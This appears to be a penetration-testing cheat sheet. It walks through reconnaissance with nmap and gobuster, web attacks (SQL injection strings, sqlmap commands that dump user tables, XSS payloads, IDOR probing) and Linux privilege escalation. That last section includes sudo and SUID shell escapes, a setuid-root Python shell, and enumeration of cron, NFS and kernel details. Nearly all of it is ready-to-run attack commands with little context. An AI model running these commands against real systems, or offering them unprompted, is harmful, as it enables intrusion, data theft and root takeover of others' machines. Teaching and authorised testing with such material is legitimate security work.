🔍 PHASE 1: RECONNAISSANCE & SCANNING

Information gathering and network/service discovery phase.

▸ STEP 1.1 - Nmap (Network Scanner) ESSENTIAL

📡 Basic Commands

Quick Scan 
nmap 192.168.1.1
All Ports with Service Detection 
nmap -sV -sC -p- -A -T4 192.168.1.1
# -sV: Service version
# -sC: Default scripts
# -p-: All 65535 ports
# -A: Aggressive scan
# -T4: Faster timing
Vulnerability Scan 
nmap --script vuln -p 80,443 192.168.1.1
▸ STEP 1.2 - Gobuster (Directory Brute-forcing) CRITICAL

📂 Basic Usage

Directory Scan 
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
With File Extensions 
gobuster dir -u http://target.com -w wordlist.txt -x php,txt,html,zip
DNS Subdomain Enumeration 
gobuster dns -d target.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

🌐 PHASE 2: WEB VULNERABILITIES

Common web application security flaws and exploitation techniques.

▸ SQL Injection (SQLi) HIGH SEVERITY

💉 Manual Testing

Basic Payloads 
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
admin' --
SQLMap Automation 
sqlmap -u "http://target.com/page?id=1" --dbs --batch
sqlmap -u "http://target.com/page?id=1" -D database -T users --dump --batch
▸ Cross-Site Scripting (XSS) HIGH SEVERITY

⚡ XSS Payloads

Basic XSS 
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
▸ IDOR (Insecure Direct Object Reference) CRITICAL

🎯 IDOR Testing

Common Patterns 
http://target.com/user?id=1234
Try: id=1, id=2, id=100

http://target.com/api/user/1234
Try sequentially: /1, /2, /3...

🔓 LINUX PRIVILEGE ESCALATION

Techniques to escalate from low-privileged user to root access.

⚠️ ALWAYS CHECK GTFOBINS.ORG!

⚠️ GTFOBins contains exploitation techniques for SUDO, SUID, and Capabilities

▸ SUDO Exploitation CRITICAL

🔍 Check SUDO Permissions

List SUDO Privileges 
sudo -l

🌐 GTFOBins Reference:

Always check https://gtfobins.org/ for the binary you can run with sudo!

vim Example

sudo vim -c ':!/bin/sh'

find Example

sudo find . -exec /bin/sh \; -quit

python Example

sudo python -c 'import os; os.system("/bin/sh")'
▸ SUID/SGID Exploitation CRITICAL

🔍 Find SUID Binaries

Find SUID Files 
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 2>/dev/null
🔗 Check SUID Exploits on GTFOBins

Example: bash with SUID

./bash -p
▸ Linux Capabilities ADVANCED

🔍 Find Capabilities

Search for Capabilities 
getcap -r / 2>/dev/null
🔗 Check Capabilities on GTFOBins

CAP_SETUID Example

./python -c 'import os; os.setuid(0); os.system("/bin/bash")'
▸ Cron Jobs Exploitation IMPORTANT

🔍 Enumerate Cron Jobs

cat /etc/crontab
ls -la /etc/cron.*
cat /var/spool/cron/crontabs/*
▸ PATH Hijacking IMPORTANT

🎯 PATH Exploitation

Check PATH 
echo $PATH
Analyze Binary 
ltrace ./suid_binary
strace ./suid_binary
▸ NFS Exploitation ADVANCED

🔍 Check NFS Shares

cat /etc/exports
showmount -e localhost
▸ Kernel Exploits LAST RESORT

⚠️ Kernel exploits can crash the system!

🔍 Check Kernel Version

uname -a
cat /proc/version
